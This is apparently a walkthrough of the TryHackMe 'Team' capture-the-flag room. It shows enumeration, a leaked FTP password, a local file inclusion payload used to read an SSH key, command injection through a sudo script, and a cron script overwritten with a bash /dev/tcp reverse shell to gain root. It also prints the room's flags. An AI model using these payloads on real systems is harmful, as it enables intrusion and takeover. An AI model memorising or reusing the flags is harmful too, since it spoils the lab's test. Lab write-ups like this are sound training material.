# [Challenge](https://tryhackme.com/room/teamcw)

# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 team`)
```nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:09:8e:e8:e6:51:ac:89:0e:66:ec:56:22:3f:1a:ef (RSA)
|   256 2e:c5:6e:7a:a8:1d:c2:51:44:11:c5:93:8c:1e:b7:68 (ECDSA)
|_  256 6e:53:3e:1a:47:90:97:d8:92:5e:a6:89:37:3e:3c:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# EXPLOITATION
There's a secret text in `/index.html`: "if you see this, add `team.thm` in your hosts!"
In `http://team.thm/` there's another page!
There's also a `robots.txt`: `dale` maybe the user?
There's a script in `http://team.thm/scripts/script.txt`:
```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```
Let's try checking `script.old`:  `ftpuser:T3@m$h@r3`
`New_site.txt`:
```
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```
Let's add `dev.team.thm` to our `/etc/hosts` and let's check the new content:

```html
<html>
 <head> 
 <title>UNDER DEVELOPMENT</title> 
 </head> 
 <body> Site is being built<a href=script.php?page=teamshare.php </a> <p>Place holder link to team share</p>
  </body> 
 </html>
```
Let's try LFI: `http://dev.team.thm/script.php?page=../../../etc/passwd` it worked!
Let's open Owasp Zap to Fuzz (follow these commands, thanks to [dalemazza](https://dalemazza.github.io/thm/THM-Team-Walkthrough/))
```
- Run a Manual Explore on the following address http://dev.team.thm/script.php?page=/../../../../../../../etc/passwd
- Right click the history line with the correct URL on and go to Attack then Fuzz
- Highlight the following /etc/passwd and select add then add again
- From the drop down bar select file then browse to the LFI woprdlist /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt Then add again
- Click ok then start fuzzer
```
Dale's `id_rsa` in `/etc/ssh/sshd_config`! Let's connect to SSH: `ssh -i dale@dev.team.thm` and grab `user.txt`: `THM{6Y0TXHz7c2d}`
# PRIVILEGE ESCALATION
`sudo -l`: `(gyles) NOPASSWD: /home/gyles/admin_checks`
```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
We can write `/bin/bash` where it asks us "Enter 'date' to timestamp the file" to gain gyles' shell. Let's open an interactive shell: `python3 -c "import pty;pty.spawn('/bin/bash')"`
We can see that there's a writeble file: `/usr/local/bin/main_backup.sh` and it's also a cron!
Let's edit this file into this:
```bash
#/bin/bash
bash -i >& /dev/tcp/10.8.13.111/4444 0>&1
```
Let's wait a minute and... we're ROOT! 
`root.txt`: `THM{fhqbznavfonq}`



